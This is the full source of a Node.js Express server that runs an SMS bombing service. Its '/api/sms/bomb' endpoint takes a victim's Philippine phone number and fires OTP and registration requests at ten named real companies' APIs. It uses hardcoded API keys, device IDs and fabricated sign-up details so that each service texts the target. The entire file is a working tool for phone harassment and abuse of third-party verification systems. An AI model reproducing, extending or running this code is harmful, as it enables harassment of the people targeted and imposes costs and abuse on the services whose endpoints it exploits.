import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // SMS Bombing Proxy Endpoints
  app.post('/api/sms/bomb', async (req, res) => {
    const { phoneNumber, service } = req.body;
    const formattedNum = phoneNumber.startsWith('0') ? phoneNumber.replace('0', '+63') : `+63${phoneNumber}`;
    const rawNum = phoneNumber.startsWith('0') ? phoneNumber : `0${phoneNumber}`; // Ensure 09... format

    try {
      let response;
      let success = false;
      let statusCode = 500;

      switch (service) {
        case 'S5.com': {
          const boundary = "----WebKitFormBoundary" + Math.random().toString(36).substring(2, 15);
          const data = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${formattedNum}\r\n--${boundary}--\r\n`;
          response = await fetch('https://api.s5.com/player/api/v1/otp/request', {
            method: 'POST',
            headers: {
              'content-type': `multipart/form-data; boundary=${boundary}`,
              'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
              'referer': 'https://www.s5.com/',
              'origin': 'https://www.s5.com'
            },
            body: data
          });
          break;
        }
        case 'Xpress PH': {
          response = await fetch("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", {
            method: 'POST',
            headers: {
              "Content-Type": "application/json",
              "conversationid": "42d64cfe-330f-4876-aed2-5a3b1547e2ce",
              "User-Agent": "Dalvik/35 (Linux; U; Android 15)"
            },
            body: JSON.stringify({
              "FirstName": "toshi",
              "LastName": "premium",
              "Email": `toshi${Date.now()}@gmail.com`,
              "Phone": formattedNum,
              "Password": "ToshiPass123",
              "ConfirmPassword": "ToshiPass123",
              "RoleIds": [4],
              "Area": "manila",
              "City": "manila",
              "FingerprintVisitorId": "TPt0yCuOFim3N3rzvrL1",
              "FingerprintRequestId": "1757149666261.Rr1VvG"
            })
          });
          break;
        }
        case 'Abenson': {
          response = await fetch('https://api.mobile.abenson.com/api/public/membership/activate_otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `contact_no=${rawNum}&login_token=undefined`
          });
          break;
        }
        case 'Excellente Lending': {
          response = await fetch('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              "domain": rawNum,
              "cat": "login",
              "previous": false,
              "financial": "efe35521e51f924efcad5d61d61072a9"
            })
          });
          break;
        }
        case 'FortunePay': {
          response = await fetch('https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
              "deviceType": 'GOOGLE_PLAY',
              "companyId": '4bf735e97269421a80b82359e7dc2288',
              "dialCode": '+63',
              "phoneNumber": rawNum.replace(/^0/, '')
            })
          });
          break;
        }
        case 'WeMove': {
          response = await fetch('https://api.wemove.com.ph/auth/users', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              "phone_country": '+63',
              "phone_no": rawNum.replace(/^0/, '')
            })
          });
          break;
        }
        case 'LBC': {
          response = await fetch('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/x-www-form-urlencoded',
              'api': 'LBC',
              'token': 'CONNECT'
            },
            body: new URLSearchParams({
              'verification_type': 'mobile',
              'client_email': `${Math.random().toString(36).substring(7)}@gmail.com`,
              'client_contact_code': '+63',
              'client_contact_no': rawNum.replace(/^0/, ''),
              'app_platform': 'Android',
              'device_name': 'rosemary_p_global'
            }).toString()
          });
          break;
        }
        case 'Pickup Coffee': {
          response = await fetch('https://production.api.pickup-coffee.net/v2/customers/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-env': 'Production' },
            body: JSON.stringify({
              "mobile_number": formattedNum,
              "login_method": 'mobile_number'
            })
          });
          break;
        }
        case 'HoneyLoan': {
          response = await fetch('https://api.honeyloan.ph/api/client/registration/step-one', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              "phone": rawNum,
              "is_rights_block_accepted": 1
            })
          });
          break;
        }
        case 'Komo': {
          response = await fetch('https://api.komo.ph/api/otp/v5/generate', {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
            },
            body: JSON.stringify({
              "mobile": rawNum,
              "transactionType": 6
            })
          });
          break;
        }
        default:
          return res.status(400).json({ success: false, error: 'Unknown service' });
      }

      success = response.ok;
      statusCode = response.status;
      res.json({ success, statusCode });
    } catch (error) {
      console.error(`Error bombing ${service}:`, error);
      res.status(500).json({ success: false, error: error instanceof Error ? error.message : 'Unknown error' });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
